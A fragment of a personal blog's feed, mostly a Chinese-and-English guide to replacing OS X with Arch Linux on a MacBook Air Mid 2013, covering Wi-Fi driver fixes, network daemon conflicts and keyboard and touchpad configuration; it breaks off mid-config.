&lt;p&gt;隨著多核心系統日益普遍，無論桌上型電腦、筆記型電腦甚至平板電腦或智慧型手機皆採用多核心處理器。如何充分使用多核心處理器所帶來的效能優勢進行工程科學計算，成為研究人員重要的課題。  &lt;/p&gt;
&lt;p&gt;多核心高效能程式調教試題將以工程科學計算作為案例提供Serial程式，參賽隊伍將可依計算環境、演算法特性等，透過平行程式語言(如：OpenMP、MPI、CUDA、OpenCL等)在競賽中所架設之環境進行平行效能測試。  &lt;/p&gt;
&lt;p&gt;希望參賽者利用對題目的了解、分析平行效率的瓶頸與瞭解平行程式撰寫，調整平行計算環境的設定，進而發揮最佳的平行計算效能；藉此增加對高速計算軟硬體環境之經驗。  &lt;/p&gt;</summary><category term="Thought"></category><category term="TSCC"></category><category term="HPC"></category><category term="Competition"></category><category term="Cluster"></category></entry><entry><title>Install Arch Linux on MacBook Air Mid 2013</title><link href="https://blog.m157q.tw/posts/2015/09/10/install-arch-linux-on-macbook-air-mid-2013/" rel="alternate"></link><published>2017-12-08T12:47:00+08:00</published><updated>2017-12-08T12:47:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-09-10:posts/2015/09/10/install-arch-linux-on-macbook-air-mid-2013/</id><summary type="html">&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;使用上遇到問題，才有動力去解決、改善、貢獻並回饋程式碼到上游。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;警告: 把 OS X 砍掉的話，之後要更新 firmware 必須使用有安裝 OS X 的外接硬碟上開機才能更新。&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;以下這段是一堆廢話，講了我為什麼決定要把 OS X 砍了然後灌 Linux 在 MacBook Air 上&lt;br /&gt;
不想看的可以直接跳過  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;改用 OS X 的這兩年，&lt;br /&gt;
也不是說就完全沒用 Linux 了，&lt;br /&gt;
舊的筆電退役成 Server 架在宿舍裡，&lt;br /&gt;
一個不用桌面環境的 Linux ，&lt;br /&gt;
使用起來基本上是不會遇到太多問題的。&lt;br /&gt;
而 OS X 的確遇到使用上的問題減少了。&lt;br /&gt;
用起來的確跟當初想的一樣，&lt;br /&gt;
是個問題比較沒那麼多的 UNIX-like System&lt;br /&gt;
但同時也在不知不覺中漸漸喪失了解決問題的能力，&lt;br /&gt;
就好像一把兩年前就不再磨的刀劍，愈發鈍鏽。&lt;br /&gt;
當初會買 MacBook Air 而不選擇 UltraBook 的原因&lt;br /&gt;
主要是因為價錢、續航力、重量都是 MacBook Air 勝出，&lt;br /&gt;
當然之後在使用上，我也對重量和續航力很滿意，&lt;br /&gt;
但其實在使用 OS X 上也遇過許多無法接受的問題，有些妥協了，有些沒有&lt;br /&gt;
例如：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原生的工具都非常老舊，舊版本代表著很多問題，無論是資安或是有無新功能。這對於一個從使用 Rolling Release 的 Arch Linux user 來說真的很不習慣。  &lt;ul&gt;
&lt;li&gt;骨灰級的 Bash 真的令我印象深刻，如果沒有 Homebrew 的話，我肯定無法用這麼久，感謝 &lt;code&gt;mxcl&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;接網路線跟螢幕線得額外花錢買轉接頭  &lt;ul&gt;
&lt;li&gt;兩個加起來新台幣 1,600 左右。恩，我跟很多人一樣都買了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OS X 10.9 以前的視窗放大真的很雞肋和令人哭笑不得，放大後不會佔滿整個桌面，有時候甚至比按完放大前更小。  &lt;ul&gt;
&lt;li&gt;在 OS X 10.10 後，放大功能直接改成全螢幕了。恩，不意外，我在 10.9 以前早就都用全螢幕了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;雙螢幕在 OS X 10.10 仍然有一個我常常踩到的詭異Bug，如果有程式被丟到外接螢幕那邊，在不拔掉螢幕線的情況下，把螢幕闔上進入休眠，接著把螢幕線拔掉，然後喚醒 Mac，這時候就會發現被丟到外接螢幕的應用程式仍然被認為是在外接螢幕的範圍。但因為早就沒有外接螢幕了，所以即便程式仍然在執行，使用者也根本看不到畫面，重點是重新執行該程式也無法解決這問題，只能登出、重開機或是重新接上外接螢幕在電腦喚醒的情況下拔掉螢幕線，或是把該程式拉回原生螢幕，才有辦法解決。  &lt;ul&gt;
&lt;li&gt;我不確定 Reproduce 的機率是不是 100%，但就是偶爾會遇到，而寫這篇文章的時候已經把我手邊唯一的 OS X 砍了，所以也無從驗證。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;系統介面內建中文字型不好看，要改也很難改。  &lt;ul&gt;
&lt;li&gt;還好 OS X 10.9 以前有 TCFail 能用，到了 OS X 10.10 只能去改系統檔案設定，而換成了我想用的字型以後，內建的中文輸入法就會掛掉，只好又改回原本的字型。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;輸入法也是個問題  &lt;ul&gt;
&lt;li&gt;剛用 OS X 10.8 的時候就聽很多人說內建的中文輸入法不是很好用，所以很多人都裝開源的香草或是小麥注音，我本身也是注音輸入法的使用者，但我用了以後還是不太習慣(恩，當時明明用不習慣，卻沒有跳下去幫忙貢獻)。後來找到另一款開源的中州韻輸入法(RIME)，是對岸的中國人&lt;a href="https://github.com/lotem"&gt;佛振&lt;/a&gt;開發的，在 Windows, Linux, Mac 上都能使用。裝來用以後發現還不錯用，自訂性蠻強大的，由於在用 gcin 時，我習慣把選字鍵從常人慣用的 1234567890 改成 asdfghjkl; 以減少手指移動的距離，這款輸入法也能做到，於是就用了。(至於後來關於 dvorak 跟拼音輸入法又是另一個故事了)  &lt;/li&gt;
&lt;li&gt;到了 OS X 10.10 之後，不知怎的，非官方的中文輸入法都變得超級慢，慢到無法接受，於是又換回不是很好用的官方中文輸入法。(恩，又是一個妥協，沒去追根究底找出為什麼變得這麼慢的原因)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一不小心好像離題寫了太多關於 OS X 的部份。&lt;br /&gt;
Anyway, 因為種種問題加上這次 COSCUP 的助力，&lt;br /&gt;
還是想回歸到 Linux Desktop Environment 的懷抱，&lt;br /&gt;
促使我把 Arch Linux 灌在我的 MacBook Air 2013 13' 上，&lt;br /&gt;
以下是紀錄。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;以下流程皆在 &lt;code&gt;MacBookAir6,2 (Macbook Air mid 2013)&lt;/code&gt; 上進行&lt;br /&gt;
不同 model 的 MacBook 會有不同的問題&lt;br /&gt;
詳見 &lt;a href="https://wiki.archlinux.org/index.php/MacBook#Model-specific_information"&gt;https://wiki.archlinux.org/index.php/MacBook#Model-specific_information&lt;/a&gt;&lt;br /&gt;
由於我是採用把 OS X 洗掉直接裝 Arch Linux 的方式，並不是雙系統&lt;br /&gt;
所以安裝方式與一般的 Arch Linux 安裝並無太大不同，&lt;br /&gt;
故本篇文章會著重在裝好之後的一些調整  &lt;/p&gt;
&lt;p&gt;如果有人想灌成 Ubuntu 的話，可以參考 &lt;a href="https://help.ubuntu.com/community/MacBookAir"&gt;https://help.ubuntu.com/community/MacBookAir&lt;/a&gt;&lt;br /&gt;
(但上面最新的資料似乎只有到 2013 年的機種就是，當然也歡迎勇者測試之後貢獻)  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;警告：MacbookAir6,2 的網卡在 Linux 上"有可能"不被支援(需視網卡型號)，  
所以可能得另購 USB 無線網卡才有無線網路  
詳情請見底下關於 Wi-Fi 的部份&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;If you want to mute the MacBook firmware boot sound,  
be sure you mute the volume of the MacBook before you eliminating OS X.&lt;/code&gt;  &lt;/p&gt;
&lt;h1&gt;Install Arch Linux Only (No OS X Dual Boot) on MacBook Air&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;WARNING: After erasing OS X,  
We can only update the MacBook Air firmware via the external drive which has already installed OS X.&lt;/code&gt;  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Make Arch Linux bootable Live USB  &lt;ul&gt;
&lt;li&gt;Go to &lt;a href="https://www.archlinux.org/download/"&gt;https://www.archlinux.org/download/&lt;/a&gt; and download the newest Arch Linux iso.  &lt;/li&gt;
&lt;li&gt;Plug in a USB drive  &lt;/li&gt;
&lt;li&gt;use &lt;code&gt;diskutil list&lt;/code&gt; to find the USB dirve &lt;code&gt;/dev/sdX&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;dd if=$(path to arch linux iso) of=/dev/rsdX bs=1m&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;use raw disk (/dev/rsdX) make this quicker.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Go to AppStore for updating OS X to the newest version  &lt;ul&gt;
&lt;li&gt;After the first update, reboot, and check for newest update again  &lt;/li&gt;
&lt;li&gt;Make sure it's newest update, espcially the firmware udpate  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Erase OS X  &lt;ul&gt;
&lt;li&gt;Reboot MacBook Air  &lt;/li&gt;
&lt;li&gt;Press Command + R to enter the Reinstall mode  &lt;/li&gt;
&lt;li&gt;Choose DiskUtility and Erase the entire disk  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Entering Arch Linux Live USB installation  &lt;ul&gt;
&lt;li&gt;Reboot MacBook Air  &lt;/li&gt;
&lt;li&gt;Press alt/option key for entering EFI bootloader  &lt;/li&gt;
&lt;li&gt;Choose EFI USB  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Install Arch Linux (Just like the normal installation with a little different)  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Beginners'_guide"&gt;Beginners' guide - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Important =&amp;gt; &lt;a href="https://wiki.archlinux.org/index.php/MacBook#Arch_Only_Installation"&gt;MacBook - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Need to be aware about the EFI related options  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;blockquote&gt;
&lt;p&gt;底下其實有些調整不是那麼必要&lt;br /&gt;
可能直接 &lt;code&gt;sudo pacman -S gnome-control-center&lt;/code&gt; 就可以解掉許多問題&lt;br /&gt;
只是個人覺得 gnome 太肥，想要用些 light weight 的 packages&lt;br /&gt;
覺得麻煩的人可以直接裝個 gnome-control-center ，然後再視情況安裝需要的東西&lt;br /&gt;
應該可以節省一些時間  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Post-Install&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBook#Post-installation"&gt;https://wiki.archlinux.org/index.php/MacBook#Post-installation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/General_recommendations"&gt;https://wiki.archlinux.org/index.php/General_recommendations&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Install &lt;a href="https://aur.archlinux.org/packages/yaourt/"&gt;yaourt&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo mkdir /var/cache/yaourt&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;save tarball to &lt;code&gt;/var/cache/yaourt&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/yaourtrc  
---  
EXPORT=1  
EXPORTDIR=&amp;quot;/var/cache/yaourt&amp;quot;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Configs&lt;/h2&gt;
&lt;h3&gt;dotfiles&lt;/h3&gt;
&lt;p&gt;Download my dotfiles on &lt;a href="https://github.com/M157q/dotfiles"&gt;https://github.com/M157q/dotfiles&lt;/a&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git clone https://github.com/M157q/dotfiles  
&lt;span class="nb"&gt;cd&lt;/span&gt; dotfiles  
make install  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Xorg&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S xcompmgr xorg-xrdb&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Xcompmgr"&gt;xcommpgr&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;for simple effect, like transparency in &lt;code&gt;guake&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/X_resources"&gt;xorg-xrdb&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;for &lt;code&gt;.Xresources&lt;/code&gt;, some config related to X Window  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Wi-Fi&lt;/h3&gt;
&lt;p&gt;不同型號的網卡會有不同的問題，這部份也需要多加注意。&lt;br /&gt;
光是參考 &lt;a href="https://wiki.archlinux.org/index.php/MacBook#Wi-Fi"&gt;https://wiki.archlinux.org/index.php/MacBook#Wi-Fi&lt;/a&gt; 可能不夠&lt;br /&gt;
必須再自行找些相關資料，我在這部份卡了一陣子。  &lt;/p&gt;
&lt;p&gt;先確認是哪張網卡&lt;br /&gt;
&lt;code&gt;MacBookAir6,2&lt;/code&gt; 沒意外的話應該都是 &lt;code&gt;BCM4360&lt;/code&gt; 這張&lt;br /&gt;
但還是有細節得注意  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ lspci -vnn &lt;span class="p"&gt;|&lt;/span&gt;grep &lt;span class="m"&gt;0280&lt;/span&gt;  
&lt;span class="m"&gt;03&lt;/span&gt;:00.0 Network controller &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;0280&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;: Broadcom Corporation BCM4360 &lt;span class="m"&gt;802&lt;/span&gt;.11ac Wireless Network Adapter &lt;span class="o"&gt;[&lt;/span&gt;14e4:43a0&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;rev &lt;span class="m"&gt;03&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;Broadcom BCM4360&lt;/code&gt; 這張網卡有兩種&lt;br /&gt;
一種是 &lt;code&gt;14e4:43a0&lt;/code&gt;, 另外一種是 &lt;code&gt;14e4:4360&lt;/code&gt;&lt;br /&gt;
根據 &lt;a href="https://wireless.wiki.kernel.org/en/users/Drivers/b43?highlight=%28b43%29#Supported_devices"&gt;https://wireless.wiki.kernel.org/en/users/Drivers/b43?highlight=%28b43%29#Supported_devices&lt;/a&gt;&lt;br /&gt;
&lt;code&gt;43a0&lt;/code&gt; 這張是被 wl 驅動程式支援的，所以如果是這張的話可以用無線網路&lt;br /&gt;
&lt;code&gt;4360&lt;/code&gt; 這張則是不被支援的，所以可能需要另外購買無線網卡&lt;br /&gt;
(我沒有親自測試過，如果有勇者或是有經驗的人歡迎回覆告知)  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;43a0&lt;/code&gt; 的話照著底下的指令做應該就可以使用無線網路連網了 (kernel 為 Linux 4.1.5-1)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;yaourt -S broadcom-wl-dkms&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;after installation, follow the postinstall instructions.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S iw&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S wicd-gtk&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;==&amp;gt; You need to restart the dbus service after  
==&amp;gt; upgrading wicd.  
==&amp;gt; Disable networkmanager, dhcpcd or other networking  
==&amp;gt; utility and add &amp;#39;wicd&amp;#39; to your systemd configuration.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;記得 &lt;code&gt;systemctl stop dhcpcd&lt;/code&gt;, &lt;code&gt;sytemctl disable dhcpcd&lt;/code&gt;,&lt;br /&gt;
&lt;code&gt;systemcl stop NetworkManager&lt;/code&gt;, &lt;code&gt;systemctl disable NetworkManager&lt;/code&gt;，&lt;br /&gt;
然後 &lt;code&gt;systemctl enable wicd&lt;/code&gt;，&lt;br /&gt;
&lt;code&gt;dhcpcd&lt;/code&gt; 或 &lt;code&gt;NetworkManager&lt;/code&gt; 都會跟 &lt;code&gt;wicd&lt;/code&gt; 衝突，&lt;br /&gt;
開著 &lt;code&gt;dhcpcd&lt;/code&gt; 或 &lt;code&gt;NetworkManager&lt;/code&gt; 的時候使用 &lt;code&gt;wicd&lt;/code&gt; 的話，&lt;br /&gt;
會無法使用無線網路連線，&lt;br /&gt;
錯誤訊息也看不出啥端倪，&lt;br /&gt;
我就是卡在這很久 Orz  &lt;/p&gt;
&lt;h4&gt;2017.10.31 更新&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Warning&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Running&lt;/span&gt; &lt;span class="n"&gt;multiple&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="n"&gt;managers&lt;/span&gt; &lt;span class="n"&gt;will&lt;/span&gt; &lt;span class="n"&gt;cause&lt;/span&gt; &lt;span class="n"&gt;problems&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;so&lt;/span&gt; &lt;span class="n"&gt;it&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="n"&gt;important&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;disable&lt;/span&gt; &lt;span class="n"&gt;all&lt;/span&gt; &lt;span class="n"&gt;other&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="n"&gt;management&lt;/span&gt; &lt;span class="n"&gt;daemons&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;  

&lt;span class="n"&gt;First&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stop&lt;/span&gt; &lt;span class="n"&gt;all&lt;/span&gt; &lt;span class="n"&gt;previously&lt;/span&gt; &lt;span class="n"&gt;running&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="n"&gt;daemons&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;like&lt;/span&gt; &lt;span class="n"&gt;netctl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;netcfg&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dhcpcd&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;NetworkManager&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;  

&lt;span class="n"&gt;Disable&lt;/span&gt; &lt;span class="n"&gt;any&lt;/span&gt; &lt;span class="n"&gt;existing&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="n"&gt;management&lt;/span&gt; &lt;span class="n"&gt;services&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;including&lt;/span&gt; &lt;span class="n"&gt;netctl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;netcfg&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dhcpcd&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;networkmanager&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Refer&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;Systemd&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="n"&gt;Using&lt;/span&gt; &lt;span class="n"&gt;units&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;  
&lt;span class="n"&gt;Note&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;You&lt;/span&gt; &lt;span class="n"&gt;might&lt;/span&gt; &lt;span class="n"&gt;need&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;stop&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;disable&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="n"&gt;daemon&lt;/span&gt; &lt;span class="n"&gt;instead&lt;/span&gt; &lt;span class="n"&gt;of&lt;/span&gt; &lt;span class="n"&gt;netctl&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;which&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;current&lt;/span&gt; &lt;span class="n"&gt;replacement&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;network&lt;/span&gt; &lt;span class="n"&gt;service&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="n"&gt;If&lt;/span&gt; &lt;span class="n"&gt;unsure&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="n"&gt;disabling&lt;/span&gt; &lt;span class="n"&gt;both&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;quote from &lt;a href="https://wiki.archlinux.org/index.php/wicd#Initial_setup"&gt;Wicd - ArchWiki&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;我猜不只 &lt;code&gt;wicd&lt;/code&gt;，&lt;br /&gt;
其他的 Network Daemon 應該也是同理，&lt;br /&gt;
不要讓他們彼此起衝突。  &lt;/p&gt;
&lt;p&gt;主要是因為我在這裡是使用 &lt;code&gt;wicd&lt;/code&gt;&lt;br /&gt;
所以如果沒有把 &lt;code&gt;dhcpcd&lt;/code&gt; 或 &lt;code&gt;NetworkManager&lt;/code&gt; 都關掉的話，&lt;br /&gt;
在 &lt;code&gt;dmesg&lt;/code&gt; 會看到以下相關的錯誤訊息：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ 6677.574915] ERROR @wl_notify_scan_status :  
[ 6677.574919] wlp3s0 Scan_results error (-22)  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ 6560.346608] ERROR @wl_cfg80211_scan :  
[ 6560.346611] WLC_SCAN error (-22)  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[ 6467.860408] ERROR @wl_notify_scan_status :  
[ 6467.860413] wlp3s0 Scan_results error (-22)  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;詳細請參考為這個問題而寫的新文章&lt;br /&gt;
&lt;a href="/posts/2017/10/31/make-bcm4360-14e4-43a0-rev-03-work-on-arch-linux-with-broadcom-wl-dkms/"&gt;用 broadcom-wl-dkms 讓 BCM4360 [14e4:43a0] (rev 03) 能順利在 Arch Linux 中使用&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;Improve DHCP connect init speed&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Add below into &lt;code&gt;/etc/dhcpcd.conf&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Disable IP ARP checking  
noarp  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Network Proxy Settings&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Proxy_settings"&gt;https://wiki.archlinux.org/index.php/Proxy_settings&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;wicd&lt;/code&gt; has no proxy setting function, I can only set proxy configuration in &lt;code&gt;Firefox&lt;/code&gt;.(This only works for web browsing)  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;networkmanager&lt;/code&gt; can have proxy settings via install plugin &lt;code&gt;proxydriver&lt;/code&gt;, check &lt;a href="https://wiki.archlinux.org/index.php/NetworkManager"&gt;NetworkManager - ArchWiki&lt;/a&gt; for how to setup.  &lt;/li&gt;
&lt;li&gt;I am kinda &lt;code&gt;wicd&lt;/code&gt; lover and don't use proxy really often, so I think I'm just ok with it currently.  &lt;/li&gt;
&lt;li&gt;(Considering write the proxy setting functionality for &lt;code&gt;wicd&lt;/code&gt;...)  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;File Manager&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S pcmanfm&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Keyboard&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S xorg-xmodmap&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;for changing keymap like swap Ctrl and Caps Lock  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Check /etc/mkinitcpio.conf if &lt;code&gt;HOOKS&lt;/code&gt; have &lt;code&gt;keyboard&lt;/code&gt;, if not, add it then &lt;code&gt;sudo mkinitcpio -p linux&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;fix &lt;code&gt;~&lt;/code&gt; problem  &lt;ul&gt;
&lt;li&gt;if you press &lt;code&gt;~&lt;/code&gt; on the keyboard, it will not print out &lt;code&gt;~&lt;/code&gt; correctly.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/modprobe.d/hid_apple.conf  
---  
options hid_apple iso_layout=0  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Backlight&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/MacBook#Keyboard_Backlight"&gt;https://wiki.archlinux.org/index.php/MacBook#Keyboard_Backlight&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;yaourt -S kbdlight&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S xorg-xev&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;For chekcing the key value of keyboard  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Synaptic (Touchpad)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo pacman -S xf86-input-synaptics&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;only basic functions&lt;br /&gt;
or  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;yaourt -S xf86-input-mtrack-git&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/BlueDragonX/xf86-input-mtrack"&gt;https://github.com/BlueDragonX/xf86-input-mtrack&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;for OS X like touchpad and flexible configuration  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/etc/X11/xorg.conf.d/10-mtrack.conf  
---  
Section &amp;quot;InputClass&amp;quot;  
    MatchIsTouchpad &amp;quot;on&amp;quot;  
    Identifier      &amp;quot;Touchpads&amp;quot;  
    Driver          &amp;quot;mtrack&amp;quot;  

    Option &amp;quot;Thumbsize&amp;quot;      &amp;quot;50&amp;quot;  
    Option &amp;quot;ScrollDistance&amp;quot; &amp;quot;150&amp;quot;  
    Option &amp;quot;Sensitivity&amp;quot;    &amp;quot;0.9&amp;quot;  
    Option &amp;quot;MaxTapTime&amp;quot;     &amp;quot;120&amp;quot;  
    Option &amp;quot;IgnoreThumb&amp;quot;    &amp;quot;true&amp;quot;  
    Option &amp;quot;IgnorePalm&amp;quot;     &amp;quot;true&amp;quot;  
    Option &amp;quot;TapDragEnable&amp;quot;  &amp;quot;false&amp;quot;  

    # Natural Scrolling  
    Option &amp;quot;ScrollUpButton&amp;quot;     &amp;quot;5&amp;quot;  
